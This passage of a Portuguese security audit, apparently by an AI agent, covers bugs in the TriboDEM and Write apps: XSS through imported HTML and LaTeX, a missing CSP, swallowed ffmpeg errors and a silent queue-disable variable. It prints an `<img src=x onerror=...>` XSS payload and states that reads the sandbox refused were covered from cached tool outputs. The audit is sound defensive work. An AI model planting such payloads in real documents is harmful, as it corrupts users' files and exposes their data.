> O que **não** está corrompido: `vida_util.json`/`csv` são escritos por caso
> (`vida_util.py:139-140`), e `lote_resumo.csv`/`lote_resumo.json` são reescritos
> **só** com o lote atual (`runner.py:431-435`). O ETA não é afetado.
>
> Remediação imediata: renomear a pasta do lote antigo. Correção completa (em
> código): limpar da pasta os casos que não estão no `lote.json`, ou filtrar a tabela
> pelos `id` do `lote.json`, ou carimbar lote + data em cada linha.

---

## PRIORIDADE 29 — TriboDEM: falha do ffmpeg no vídeo de vida útil é engolida (BAIXO)

**Arquivo:** `...\TriboDEM_Studio\tribodem\vida_util.py:250-254` (+ `:274-279`)

```python
r = subprocess.run([ffmpeg, "-hide_banner", "-loglevel", "error", "-y", ...], capture_output=True, text=True)
shutil.rmtree(destino, ignore_errors=True)      # apaga os quadros MESMO com falha
return saida.name if r.returncode == 0 and saida.exists() else None
```

O `stderr` do ffmpeg é capturado e **nunca inspecionado**. Em `processar()`
(`:274-279`) só a **exceção** gera aviso (`aviso_video_vida`) — a **falha** do ffmpeg não.
Resultado: se o ffmpeg falhar (codec ausente, disco cheio, PNG com dimensão ímpar,
ffmpeg fora do PATH do WSL), o vídeo não é gerado, **os quadros intermediários são
destruídos**, e o `resultado.json` sai **sem vídeo e sem motivo**. O Monitor marca o
caso como "concluído". O conclui que o recurso não existe — quando foi erro de
codificação.

**Contraste:** o vídeo principal **falha alto** (`render.py:402-403`: `raise
RuntimeError("ffmpeg failed: " + r.stderr[-800:])`). O de vida útil é o único que engole.

**Correção mínima (1-3 linhas), reusando o caminho de exceção que já existe:**
```python
# vida_util.py:250-254
if r.returncode != 0 or not saida.exists():
    raise RuntimeError("ffmpeg failed: " + (r.stderr or "")[-300:])
```
Assim o `except` existente em `processar()` (`:277-279`) grava o aviso no
`resultado.json` — **sem campo novo**.

**Toca o fluxo do Yuri:** sim — o vídeo de vida útil é uma das entregáveis que ele leva
para a discussão. **Confiança:** alta.

> **VERIFICADO adversarialmente (20/10, rodada 6 — sobrevive, severidade corrigida MÉDIO → BAIXO).**
> O caminho real confere: `vida_util.py:250` roda o ffmpeg do vídeo da vida acelerada no processo WSL do runner; se o comando falha (encoder ausente, disco cheio, OOM), `returncode != 0` devolve `None` (`vida_util.py:254`) e o `stderr` capturado é jogado fora. Como `processar()` só grava aviso quando a **exceção** sobe (`vida_util.py:275-279`), o retorno `None` não deixa rastro: o `resultado.json` fica sem `video_vida_util` e sem aviso, o caso segue "concluído" no Monitor e o lote termina com sucesso.
>
> **Por que BAIXO e não MÉDIO:** os números que o Yuri leva para a tese (`vida_estimada_revestimento_h`, desgaste, vida por peça) vêm de `calcular()` e **já foram gravados** em `vida_util.json`/csv **antes** do vídeo — nenhum número é corrompido. O que se perde é o **artefato de apresentação** (o vídeo de 20 s) e a mensagem de erro para diagnosticar, descoberta tarde. O vídeo principal tem cobertura (`render.py:403` falha alto); este é o único que engole.
>
> **Correção:** o `raise` sugerido (em `video()`) resolve a visibilidade, porque `processar()` captura a exceção e grava `aviso_video_vida`; falta checar o `returncode` e guardar o `stderr` em vez de descartá-lo.

---

## PRIORIDADE 30 — TriboDEM: variável de ambiente desliga a exclusão mútua CPU/GPU em silêncio (BAIXO)

**Arquivo:** `...\TriboDEM_Studio\tribodem\fila_calculos.py:199-200` (+ `:1-17`) · `runner.py:540`

```python
if os.environ.get("FILA_CALCULOS_DESLIGADA"):
    return None
```

A exclusão mútua entre TriboDEM e Flow Calculation é **decisão explícita do Yuri**
(fila por recurso, prioridade do QE na CPU; `TAREFAS.md` itens 92/98/102). A variável
que a desliga é **silenciosa**: não há comentário no código, aviso no log, nem indicação
no Monitor. Se vazar para o ambiente do WSL, o sintoma (lotes lentos, resultados
instáveis) aparece longe da causa. O `runner.py:540` segue como se tivesse o recurso.

**Correção (1-3 linhas):**
```python
if os.environ.get("FILA_CALCULOS_DESLIGADA") == "1":
    print("[fila] AVISO: exclusao mutua CPU/GPU DESLIGADA — calculos pesados do TriboDEM e do Flow podem rodar ao mesmo tempo", file=sys.stderr)
    return None
```
Comentar a linha no código (estilo `shortcut:`) e registrar o estado da fila no
`monitor.json`, para o Yuri ver que a proteção está fora.

**Toca o fluxo do Yuri:** sim — é a fila que ele implementou. **Confiança:** alta.
**Estado:** verificado adversarialmente em 20/10 — **sobrevive, severidade MÉDIO confirmada** (era BAIXO). A variável `FILA_CALCULOS_DESLIGADA` é lida como booleano de verdade (`fila_calculos.py:199-200`): **qualquer valor não-vazio** desliga a fila — inclusive `"0"` ou `"false"` — sem log, sem aviso e sem teste do valor. Nada no projeto define a variável (nenhuma ocorrência além da leitura), logo o gatilho é externo/opt-in, não acidental.

O efeito é real e silencioso: o `flock` de `~/.fila_calculos/trava_gpu` é a **única** exclusão mútua entre processos DEM-Engine (o `flock` só aparece em `fila_calculos.py`; o `LimitadorGPU` em `dem_gpu.py:62-72` é um **teto de uso**, não exclusão, e ainda está desativado por padrão sem `TRIBODEM_GPU_LIMITE_INTERNO=1`). Dentro de **um** lote o runner serializa os casos de GPU (`runner.py:447`), mas entre **dois** runners/lotes a exclusão some. A própria casa registra o dano: `dem_gpu.py:643-644` avisa que o DEM-Engine trava em futex "ex.: dois processos DEME na mesma GPU", e `TAREFAS.md:92`/`:98` registra a regra "o PC não aguenta os dois". Consequência: **cálculo de horas perdido**, com o watchdog matando o caso (`TRIBODEM_VIGIA_MIN` / `TRIBODEM_GPU_VIGIA_S`, `dem_gpu.py:647`) e o caso virando ERRO — dano real, mas **sem perda de dados** e **não disparado por padrão**; daí severidade MÉDIO, não ALTO.

A correção sugerida está certa mas **incompleta**: falta aplicar o mesmo no arquivo gêmeo `flowcalc/fila.py` (a docstring em `fila_calculos.py:17` manda manter os dois iguais — **não** verificado por leitura direta) e registrar a desativação no `lote.json`/Monitor (o `stderr` só chega ao `controlador.log`, `qt_app.py:572`), além de um teste do valor exato. **Não verificado:** o valor real da variável no shell do WSL do usuário (acesso negado) e o conteúdo de `flowcalc/fila.py`.

---

## PRIORIDADE 31 — Write: HTML importado entra cru no editor (XSS no renderer) (ALTO)

**Arquivo:** `...\Write\codigo-fonte\src\docio.js:742` e `:706` · `doc.js:513` e `:526` ·
entradas em `app.js:182`, `app.js:276`, `doc.js:568`, `docio.js:944-946`

O `normalizeImported` (importação de HTML/Markdown) monta o documento final em HTML.
Dois caminhos entregam **HTML cru** em vez de texto escapado:

```javascript
// docio.js:742 — bloco com class fig/tab/toc/pgbrk: o outerHTML COMPLETO
if (c.contains("fig") || c.contains("tab") || c.contains("toc") || c.contains("pgbrk")) {
  push(n.outerHTML, { k: ... }); continue;
}
// docio.js:706 — cleanInline: idem para cite/xref/m/fn/cmt
if (c && (c.contains("cite") || ...)) { out += n.outerHTML; return; }
```

`outerHTML` preserva **todos os atributos**, inclusive `onerror`, `onload`, `onclick`.
O HTML montado é gravado no editor com `ed.innerHTML = s.html` (`doc.js:513`, `doc.js:526`).
A lista negra de tags (`docio.js:709` e `:743`) cobre `SCRIPT`, `IFRAME`, `SVG`… mas
**não cobre atributos `on*`**.

**Cenário concreto:** o Yuri abre um `.html` (ou arrasta para o app — `app.js:276`) que
contém `<div class="fig"><img src=x onerror="...">`. A importação aceita, o bloco entra
no documento, e o `onerror` **executa** quando o Chromium tenta carregar a imagem inexistente.
O documento adulterado é depois salvo (IndexedDB) e exportado.

**Por que é crítico aqui:** o renderer tem acesso ao IndexedDB (`write-app`, `app.js:7`),
ao `localStorage` (`prelo:`, `core.js`) e à rede. Um `fetch` para fora não sai
(confirmado: o preload só expõe dois canais de arquivo, `Write.js:71` com
`contextIsolation: true` + `sandbox: true`), mas a **integridade do documento** do Yuri
já está comprometida: o arquivo adulterado é salvo e exportado como se fosse o original.

**Correção (substituir `outerHTML` por reconstrução a partir de lista branca):** o
`cleanInline` já reconstrói cada tag known (`<strong>`, `<em>`, `<a href>` escapado em
`:725`) — o `default:` em `:726` é o buraco. A correção mínima é **não** usar
`n.outerHTML` em `:742`/`:706`, e sim reconstruir o elemento (copiando só os atributos
declarados: `class`, `id`, `data-*`, `src`, `alt`, `width`). Alternativa pronta: incluir
o DOMPurify já usado no app — verificar se ele está disponível offline (o Write guarda
bibliotecas em disco, `computador/Write.js:45-62`).

**Toca o fluxo do Yuri:** sim — abrir HTML/Word/Markdown é uso normal dele.
**Estado:** verificado adversarialmente em 20/10 — **sobrevive, severidade ALTO confirmada**.

**Verificação adversarial (20/10, reprodução e severidade).** 1) Abrir `.html` passa por `normalizeImported` antes de abrir a aba (`app.js:182`) — o texto **não** entra cru sem filtro; mas o filtro é **só lista negra de TAGS**. 2) `cleanInline` (`docio.js:700`) escapa os nós de texto (`:703`), converte `<br>`, **descarta** `<img>` comum e tags da lista negra (`:708-709`) e reconstrói inline conhecido com `href` escapado (`:725`) — mas **não remove atributos `on*` nem `javascript:`**. 3) **Dois furos entregam `outerHTML` cru**: `docio.js:706` (classe `cite`/`xref`/`m`/`fn`/`cmt`) e `docio.js:742` (classe `fig`/`tab`/`toc`/`pgbrk`); `outerHTML` preserva **todos** os atributos. 4) **O `onerror` sobrevive**: `<img src=x onerror=...>` dentro de um `.fig`/`.tab`/`.toc`/`.pgbrk` (`:742`) ou com class `cite`/`xref`/`m`/`fn`/`cmt` (`:706`) sai cru; `<img>` solto é descartado por `:708`. 5) O sink é `ed.innerHTML = s.html` (`doc.js:513` e `:526`), **sem `esc()`** — o `esc` (`core.js:6`) só entra em nós de texto e `href`/`label`. 6) **Arrastar-e-soltar** (`app.js:276`) e **colar** (`doc.js:568`) passam pelo mesmo `normalizeImported` (o paste via `execCommand('insertHTML')`) — o mesmo furo se repete. 7) Renderer sem `nodeIntegration`, com `contextIsolation` + `sandbox` e preload expondo só canais de arquivo (`Write.js:71`): **não há RCE** nem leitura/escrita arbitrária em disco; há acesso a IndexedDB (`write-app`, `app.js:7`), `localStorage` e rede → **exfiltração**. O dano principal é a **integridade**: o documento adulterado é salvo (IndexedDB) e exportado como se fosse o original. 8) O gatilho é **local** — abrir/arrastar/colar HTML de terceiros (página salva, tutorial, arquivo baixado); **não há vetor remoto automático**. 9) Não há CSP em lugar nenhum — nada bloqueia handler inline; se existisse `script-src 'self'` sem `unsafe-hashes`, o `onerror` seria bloqueado, mas não existe (ver PRIORIDADE 33). 10) Na versão web o alvo seria o `window.claude` do usuário (`cloud.js:19-36`, capacidades `user`/`db`/`assets`).

**Ressalva do verificador:** a leitura direta do projeto Write foi negada pelo sandbox, então `Write.js:71`, `preload.js`, `build.py`/`index.html` (ausência de CSP) e o interior de `app.js:276` foram corroborados pelo próprio documento de auditoria e por saídas de grep/fontes em cache, **não** por leitura direta; `docio.js`/`doc.js`/`app.js`/`core.js` foram lidos via cache de saídas de ferramenta com números de linha preservados.

---

## PRIORIDADE 32 — Write: LaTeX importado insere conteúdo cru (XSS no renderer) (ALTO)

**Arquivo:** `...\Write\codigo-fonte\src\docio.js:973` (e `:978`, `:983`, `:986-988`) ·
`doc.js:102` · `core.js:516` e `:529` · `doc.js:204` · entradas `app.js:176` e `:177-181`

No `texInline`, o conteúdo dos grupos LaTeX é inserido **sem escapar**:

```javascript
// docio.js:973
const wrap = (cmd, open, close) => { ...
  s = s.slice(0, m.index) + open + g.v + close + s.slice(m.end); };
// docio.js:987 — wrap("textbf", "<strong>", "</strong>") e afins
// docio.js:983 — \textcolor → `<span style="...">${g.v}</span>`
// docio.js:978 — \writecomment → `<span class="cmt" ...>${x.v}</span>`
```

`g.v` é o texto cru que estava entre as chaves. O resultado entra em
`<p>${h}</p>` (`docio.js:1080`), `<h1>${texInline(...)}</h1>` (`:1088`), nas células de
tabela (`:1110-1111`) que viram `<td contenteditable="true">${c}</td>` (`doc.js:102`), e
na figura (`figHTML`, `doc.js:93-95`, que interpola `src` sem escape).

Pior: a **bibliografia** guarda o HTML pronto — `docio.js:1015`
(`rawhtml: texInline(txt, ctx)`) — devolvido sem escape por `core.js:516`/`:529` e escrito
com `innerHTML` em `doc.js:204`.

**Cenário concreto:** o Yuri abre um projeto `.tex` (do Overleaf, `:177-181`) com
`\textbf{<img src=x onerror="...">}`. O `delatex` (`:995`) remove comandos, **não** remove
HTML. O `<img>` chega ao `innerHTML` e o `onerror` executa.

**Correção:** escapar `g.v` no ponto de inserção — trocar `open + g.v + close` por
`open + esc(g.v) + close` em `texInline` — e escapar `src` em `figHTML`
(`doc.js:94`). Como `texInline` é o único ponto de saída do LaTeX, **uma** correção
cobre o parágrafo, o título, a tabela, a figura e a bibliografia.

**Toca o fluxo do Yuri:** sim — abrir `.tex`/`.zip` de projeto LaTeX é uso normal dele.
**Verificado adversarialmente em 20/10:** o caminho foi rastreado **inteiro e sem
escaping**: `.tex`/`.zip` → `openLatex` (`app.js:189`) → `importLatexDoc`
(`docio.js:1063-1141`) → `texInline` → `wrap()` com `g.v` cru → `delatex`
(`core.js:466-470`, que só remove `{}` e troca comandos — **não** escapa `<`/`>`) →
`<p>${h}</p>` (`docio.js:1080`) → `loadDocState` → `ed.innerHTML = s.html`
(`doc.js:513`). A função `esc` existe (`core.js:6`) e é usada em `href`/`url`/`labels`,
mas **nunca** em `texInline`. O payload `<img src=x onerror=...>` dentro de
`\textbf{...}` sai como `<strong><img src=x onerror=...></strong>` e o `onerror`
dispara no `innerHTML`.
**Severidade corrigida de CRÍTICO para ALTO:** não há `nodeIntegration` no Electron
(`Write.js:71` — `contextIsolation: true`, `sandbox: true`), então é XSS de renderer
com exfiltração, **não** execução de código no host; na versão web do Write o alvo é o
`window.claude` do usuário (`cloud.js:19-36` — capacidades `user`/`db`/`assets`).
**Ressalva do verificador:** o `src` da figura (`figHTML`) **não** é movido pelo `.tex` —
no caminho LaTeX ele só pode ser um `data:` URL gerado do próprio `.zip`
(`docio.js:1000-1010`, `core.js:121-124`), então a interpolação sem escape em
`figHTML` é um problema **em si** (o `src` vindo da importação de `.docx`,
`docio.js:791` / `docxin.js:414`, também não é escapado), mas **não** é o vetor
principal. Também **não** foi verificado: o pipeline de slides/Beamer
(`importBeamer`/`slideio.js`) — o `wrap` é idêntico no bundle, então o vetor
provavelmente existe lá também.

---

## PRIORIDADE 33 — Write: não há Content-Security-Policy em lugar nenhum (MÉDIO — verificado em 21/10, era ALTO)

**Arquivo:** `...\Write\codigo-fonte\build.py:6-21` (gera o `index.html` do app) ·
`computador\Write.js:39` (seta **só** `content-type`) · `computador\app\index.html` ·
`navegador\Write.html`

O `index.html` do Write é montado por `build.py` e **não tem CSP**. O `protocol.handle`
do Electron (`Write.js:39`) responde com `content-type` e nada mais. Um grep por
`Content-Security-Policy` no projeto inteiro só acha ocorrências dentro de
`testes/node_modules/playwright*` — **nenhuma no código do app**.

**Por que importa:** a CSP é a única barreira restante contra PRIORIDADES 31 e 32. O
`contextIsolation` + `sandbox` impedem o renderer de alcançar o Node, mas **não**
impedem um `<script>` injetado de rodar no renderer e de falar com a rede. Sem CSP, um
injeção tem efeito livre; com `script-src 'self'`, o payload inline morre.

**Correção (uma linha no `build.py`, dentro do `<head>`):**
```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob: https:; connect-src 'self' https://*.googleapis.com">
```
`'unsafe-inline'` no `script-src` é necessário porque o app junta o JavaScript num
`<script>` único no `build.py:19` — **mas** ainda mata `onerror=`/`onclick=`, que são
atributos de evento inline e caem sob `script-src` mesmo com `'unsafe-inline'`, já que
CSP só permite handlers inline se o elemento for permitido por `unsafe-hashes`. Ou seja:
**a CSP sozinha já neutraliza o vetor das PRIORIDADES 31 e 32**, sem precisar da
reconstrução por lista branca. As duas correções são complementares, não alternativas.

> ⛔ **TEXTO ACIMA — REFUTADO POR TESTE EMPIRICO (21/10). NÃO APLICAR.**
> As duas afirmações em negrito estão **erradas**: (a) `'unsafe-inline'` em `script-src`
> **NÃO** mata `onerror=`/`onclick=` — medido: o handler executa; (b) a `<meta>` no
> `build.py` cairia **fora do `<head>`** e seria **ignorada** pelo navegador. A correção
> real está na seção "VERIFICADO em 21/10" logo abaixo, e é **header CSP** no
> `Write.js:38-40` + `nonce`/hash nos dois `<script>` inline do `build.py:15-20`.
> O texto foi mantido só para registrar o que o achado original propunha.

**Toca o fluxo do Yuri:** sim — CSP pode quebrar MathJax inline e o cache de CDN; testar
antes de aplicar. **Confiança:** alta. **Estado:** achado do agente, em verificação adversarial.

### ✅ VERIFICADO em 21/10 — o FATO se confirma, mas a CORREÇÃO proposta está ERRADA (severidade ALTO → MÉDIO)

Rodei **teste empírico** (Playwright + Chromium, página de teste fora da pasta Write,
em `%TEMP%` — nada foi escrito no projeto) para responder as duas perguntas que o
achado original deixou abertas: (1) a `<meta http-equiv="Content-Security-Policy">`
proposta **realmente bloqueia** o `onerror`? (2) ela **quebra** o app?

**Resposta 1 — NÃO. A premissa do achado está invertida.** O documento afirmava (e eu
repeti antes de testar) que `'unsafe-inline'` em `script-src` bloqueia handlers inline
porque eles "caem sob `script-src` mesmo com `'unsafe-inline'`, já que CSP só permite
handlers inline se o elemento for permitido por `unsafe-hashes`". **Isso é falso.**
Medido no Chromium do Playwright:

| Caso | `onerror` executou? | Script inline executou? |
|---|---|---|
| A. sem CSP (baseline) | **sim** | sim |
| B. CSP no `<head>`, `script-src` COM `'unsafe-inline'` | **sim** ← XSS passa | sim |
| C. CSP no `<head>`, `script-src` SEM `'unsafe-inline'` (só hash) | não ← barrada | sim |
| D. CSP no `<body>` (é onde o fragmento do `build.py` cai), com `'unsafe-inline'` | **sim** ← XSS passa | sim |
| E. CSP no `<body>`, só hash | **sim** ← XSS passa | sim |

Ou seja: **com `'unsafe-inline'` em `script-src`, o `onerror` continua executando** —
o vetor das PRIORIDADES 31 e 32 **não** é neutralizado pela CSP como escrito. Só
`script-src` **sem** `'unsafe-inline'` (com `nonce` ou `sha256` do `<script>`) barra o
handler. Verificado: caso C (hash sem `unsafe-inline`) e caso H/J (nonce) barram o
`onerror` **e** mantêm o bundle rodando. (A MDN é ambígua nesse ponto; o comportamento
real do Chromium é o que vale aqui.)

**Resposta 2 — sim, e em DOIS lugares onde a proposta erra.**

1. **A `<meta>` do `build.py` cairia fora do `<head>` e seria IGNORADA.** O
   `build.py:6-21` gera um **fragmento** (sem `<html>`/`<head>`); quem embrulha é o
   `computador/montar.py:7-9`, que coloca tudo **dentro do `<body>`**. O navegador
   **ignora** meta CSP fora do `<head>` — medido, com a mensagem exata:
   *"The Content Security Policy '...' was delivered via a `<meta>` element outside the
   document's `<head>`, which is disallowed. The policy has been ignored."*
   **Ou seja: a linha proposta no `build.py` não faria NADA no build do Electron** —
   a política seria descartada e o app ficaria exatamente como está. A mesma coisa
   vale para `navegador/Write.html:3-6` (head sem meta CSP) e para
   `computador/app/index.html:4-5` (só charset + viewport).
2. **A política proposta quebraria o app em três pontos** que eu não tinha listado:
   - **Vídeo:** sem `media-src`, cai em `default-src 'self'` → o `<video src="data:...">`
     de `slides.js:225` e `slideio.js:115` (e o `pickVideo` de `core.js:73-80`) para
     de tocar. Precisa `media-src 'self' data: blob:`.
   - **Fonte embutida do PDF:** o `pdf.js` injeta `@font-face` com `URL.createObjectURL(blob)`
     quando `disableFontFace` não é `true` — e só `docio.js:807` usa `disableFontFace:true`.
     `app.js:301`, `pdfedit.js:12-13` e `slideio.js:822-823` **não** usam → precisam
     `font-src 'self' blob:`.
   - **Falta** `object-src 'none'`, `base-uri 'none'` e `frame-ancestors 'none'`.

**Correção real (menor custo, sem mexer no `core.js`):** em vez de `<meta>` no
`build.py`, usar o **header** na resposta do Electron (`computador/Write.js:38-40`),
que é aplicado em qualquer lugar do documento e vale também para o `navegador/Write.html`:

```
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-<valor-aleatorio-por-carga>' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://unpkg.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com data: blob:;
  img-src 'self' data: blob: https:;
  media-src 'self' data: blob:;
  worker-src 'self' blob:;
  connect-src 'self' https://api.crossref.org https://api.openalex.org;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

E o `nonce` tem que ser **injetado nos DOIS `<script>` inline** do `build.py:15-20`
(o `window.MathJax` e o bloco com os 13 módulos) — sem isso o app nem abre, porque
`'unsafe-inline'` desaparece. Com o nonce no `<script>` e **sem** `'unsafe-inline'`,
o `onerror` morre (medido) **e** o bundle continua rodando (medido).

**Por que a severidade caiu de ALTO para MÉDIO:** a ausência de CSP é um **controle de
defesa em profundidade que falta** — ela **amplifica** o XSS das PRIORIDADES 31 e 32
(sem CSP o payload talks freely: `localStorage`, IndexedDB, rede; e o arquivo adulterado
é salvo e exportado) e o cache de CDN sem hash da PRIORIDADE 35, mas **não concede
privilégio novo sozinho**: o Electron não tem `nodeIntegration`, tem
`contextIsolation: true` + `sandbox: true` (`Write.js:71`), e o `preload.js:4-7` só
expõe `onOpenFile`/`ready`. O ganho real da CSP é **contenção** do dano, não
prevenção. E o gatilho continua sendo local (abrir/arrastar/colar HTML de terceiros).

**O que eu NÃO consegui verificar (situação em 21/10, após as rodadas 8 e 9):**
(a) se o host `claude.ai` implementa `window.claude.use` via `fetch` para outra
origem — o repositório não tem esse código; se for, `connect-src 'self'` quebraria
downloads/`db` na versão web; **(e)** o comportamento do `pdf.js` se o
`pdf.worker.min.js` não estiver no cache — o cache real
(`%APPDATA%\Write\bibliotecas`) hoje tem só MathJax e fontes; **(f)** a CSP **header**
contra o **Electron real** — o `computador/node_modules` está vazio (Electron 33.2.1
não instalado), então validei em Chromium 156, não em Electron.
**FECHADO por medição desde então:** (b) o MathJax 3.2.2 **não** exige
`'unsafe-eval'`; (c) a suíte de `testes/` **passa** com a CSP ativa (30 testes,
`rc=0` sem e com a CSP; as 6 falhas da 1ª passada eram o `addScriptTag` inline do
**próprio teste**, e 8/8 passam depois de trocar por `<script src>`); (d) o `pdf.js`
3.11.174 usa **fake worker** (`pdfjsWorker.WorkerMessageHandler`, main thread) — o
app real cria **0 workers** e o `pdfjs` carrega igual com `worker-src 'none'` ⇒
`worker-src blob:` é desnecessário (e não vai na política).

### ✅ Rodada 8 (21/10) — lacuna (b) **FECHADA por medição**: `'unsafe-eval'` NÃO é necessário

Rodei o **MathJax 3.2.2 real** (o `tex-svg.min.js` de 2 065 978 bytes que está no cache
do app, `%APPDATA%\Write\bibliotecas`) numa página com CSP **por header**, com
`script-src` **sem** `'unsafe-inline'` **e sem** `'unsafe-eval'`, o MathJax vindo do
`cdnjs` (como no app) e o bundle inline autorizado por `sha256`.

| Caso | bundle rodou | MathJax carregou | `tex2svg` → SVG | violação de `unsafe-eval` |
|---|---|---|---|---|
| sem CSP (baseline) | sim | sim | **sim** | 0 |
| CSP por header, sem `'unsafe-eval'` | sim | sim | **sim** | **0** |
| CSP por header, com `'unsafe-eval'` | sim | sim | sim | 0 |

**Veredito: `'unsafe-eval'` é DISPENSÁVEL.** E o motivo está no código, não no acaso:
o `tex-svg.min.js` tem exatamente **dois** usos de execução dinâmica —
`eval("require")` em `SystemExternal.extRequire` (só roda se `process` existir; no
renderer com `sandbox: true` e sem `nodeIntegration` **não existe**) e
`new Function("return this")` dentro de um `try` (só roda se `globalThis` for
`undefined`, o que não acontece em Chromium moderno) — e **nenhum dos dois é alcançado**.
Os outros 9 `Function(` do bundle são do runtime do webpack (`__webpack_require__.g`),
não do motor de TeX.

**Consequência para a política:** `script-src` **sem** `'unsafe-inline'` **e sem**
`'unsafe-eval'` fecha o vetor dos handlers inline (medido na rodada 7) **sem** sacrificar
o MathJax. A política da rodada 7 fica **mantida** — não precisa de `'unsafe-eval'`.

**Outras três coisas medidas por leitura (não por execução) que fecham lacunas do
escopo mínimo da correção:**

- **O app NÃO tem handler inline legítimo** — `grep` de `onerror=|onclick=|onload=|onchange=|oninput=|onsubmit=|onmouseover=` nos **13** módulos de `codigo-fonte/src/` e em `body.html`: **zero ocorrências** (o único hit de `on...=` em `body.html` é `contenteditable=`, que não é handler). Uma CSP sem `'unsafe-inline'` **não quebra o app** por causa de handlers.
- **O app NÃO usa `eval`/`new Function`** — `grep` de `eval\(|new Function\(` nos 13 módulos: **zero ocorrências**. O `unsafe-eval` é desnecessário por dois caminhos independentes.
- **O `cite.js` ESTÁ no build** (`build.py:5` lista 13 módulos, incluindo `cite.js`) e faz `fetch` cross-origin para `api.crossref.org` e `api.openalex.org` (`cite.js:115`, `:121`, `:128`, `:135`) ⇒ `connect-src` **precisa** dessas duas origens, senão a busca por DOI/título quebra. (Correção ao que eu escrevi antes: eu tinha dito que o `cite.js` não entrava no build — errado.)
- **`blob:` é precaução, não necessidade.** O único `URL.createObjectURL` do app é o **download** (`core.js:63`); as mídias do documento são `data:` base64 (`cloud.js:53` — `MEDIA_RE` só casa `data:`), não `blob:`. `img-src`/`media-src` precisam de `data:`, não de `blob:`.

**O que o `sha256` do bundle revela (armadilha de operação):** calculei o hash do `<script>`
inline dos **4** `index.html` do projeto e **todos são diferentes** — `dist`
(`sha256-LJeFiNoT0vYh4bmE4oqc66YEFGlsAj3GdFIJCN03sbw=`), `computador/app`
(`sha256-jNsOW9qQW66XHYNPA6KbLJZGHWylR0DCiFxbvpvQ0l0=`), `navegador/Write.html`
(`sha256-sweCJIEI0UgWgsPuCWEC20TFanVgXA57Kb6HIpyMTQU=`) e o **instalado** em
`%LOCALAPPDATA%\Programs\Write\resources\app\app\index.html`
(`sha256-jNsOW9qQW66XHYNPA6KbLJZGHWylR0DCiFxbvpvQ0l0=`). Só o hash do `<script>` do
`window.MathJax` (112 bytes) é estável (`sha256-tOhbnir9TGeU7ODdJaZZItvpd1ImEPyskWb5E9tsTkM=`).
**Consequência: a CSP por `sha256` do bundle é um FAIL SILENCIOSO** — cada rebuild
troca o hash, e se ninguém regenerar a política, o app **abre em branco** (o `<script>`
é barrado e não há sintoma além de uma tela vazia). É por isso que a correção de menor
custo é **nonce** (gerado por carga), não hash.

**Estado do app instalado (confirma que os achados são reais no binário em uso):**
`Write.js` e `preload.js` instalados em `%LOCALAPPDATA%\Programs\Write\resources\app\`
são **byte a byte idênticos** ao repo (sha256 `587cd4a8…` e `fa37671e…`; só o
`package.json` difere, por versão). O `index.html` instalado (14/10 15:17) tem
**os mesmos 5 sinks de `outerHTML`** que o `dist` atual e **zero** `Content-Security-Policy`.
Ou seja: **P31, P32 e P33 valem para o programa que o Yuri usa hoje.**

**Desalinhamento de build (risco operacional, achado novo):** `computador/app/index.html`
(19/10 23:10, 731 194 bytes) está **desatualizado** em relação a
`codigo-fonte/dist/index.html` (21/10 08:21, 758 570 bytes) — o `LEIA-ME.md:45-48`
manda rodar `build.py` e depois `montar.py`, e o `montar.py` **não** foi rodado depois do
último `build.py`. Como o `LEIA-ME.md:46` diz, é o `build.py` que gera o `dist`, e é o
`montar.py` que copia para `computador/app/`. Uma CSP por hash pioraria isso (o hash do
`app/index.html` não bateria com o do `dist`); uma CSP por nonce, não.

**Design da correção — por que NONCE e não SHA256 (medido, não opinado):**

| Opção | Como funciona | Custo | Risco |
|---|---|---|---|
| **`sha256` do bundle** | `build.py` grava o hash num arquivo; o `Write.js` lê e monta o header | 2 arquivos, ~10 linhas | **FAIL SILENCIOSO**: o hash do bundle muda a cada build (medido: 4 hashes diferentes nos 4 `index.html` do projeto). Se ninguém regenerar a política, o `<script>` é barrado e **o app abre em branco**, sem sintoma além de tela vazia |
| **`nonce` por carga** | o `Write.js` gera `crypto.randomBytes(16).toString('base64')` por carga e **substitui** os dois `<script>` inline do HTML servido | ~8 linhas, **1 arquivo só** | Se o `build.py` gerar HTML novo, o nonce ainda serve (é injetado em runtime). **Único risco:** a substituição por string tem que achar os 2 `<script>` — **verificado: há exatamente 2 `<script>` exatos no arquivo e ZERO `<script>` literal dentro do conteúdo do bundle** (`dist`, `computador/app` e `navegador/Write.html`), então a substituição é sem falso positivo |
| **nonce no `build.py`** | o build sorteia o nonce e grava nos `<script>`; o `Write.js` lê o nonce de algum lugar | 3 arquivos | Pior: exige **duas fontes de verdade** (o nonce no HTML e o nonce no header) que podem dessincronizar; e o `nonce` fixo no arquivo **não é mais nonce** (vira hash disfarçado) |

**Veredito: nonce gerado no `Write.js` por carga, com substituição de string no HTML
servido.** Uma fonte de verdade, um arquivo só, sem fail silencioso, e não exige mexer no
`build.py` (que a vlrm está em vias de tocar).

**Atualização da rodada 9 (21/10) — o veredito acima foi confirmado e a política final
medida está no bloco "Rodada 9" do cabeçalho do documento.** Resumo do que a rodada 9
mudou: (1) **`worker-src` sai da política** (o pdf.js usa fake worker; 0 workers
criados pelo app real); (2) **`connect-src` fica sem `fonts.googleapis.com`** (alegação
refutada por medição — o `<link>` de folha de estilo é `style-src`, não `connect-src`);
(3) **`style-src` PRECISA de `'unsafe-inline'`** (o app usa `style=` inline em 111
lugares; sem isso o documento aparece sem formatação — medido); (4) **a suíte de
`testes/` passa com a CSP ativa** (30 testes, `rc=0` sem e com; as 6 falhas da 1ª
passada eram o `addScriptTag` inline do **próprio teste**, e 8/8 passam trocando por
`<script src>`); (5) **a nonce continua sendo a melhor opção** — a CSP por `sha256` do
bundle é fail silencioso, confirmado pelos 4 hashes diferentes nos 4 `index.html` do
projeto. **A única coisa que a rodada 9 não fecha:** a CSP **header** contra o
**Electron real** (o `computador/node_modules` está vazio — Electron 33.2.1 não
instalado; validei em Chromium 156). **Antes de aplicar no Electron, o Yuri tem de
instalar o Electron em `computador/` e repetir 1 teste** — ou aceitar o risco
documentado, que é baixo (o `protocol.handle("app")` já devolve a `Response`, então
cabe um header).

**Escopo por via de entrega (medido):**

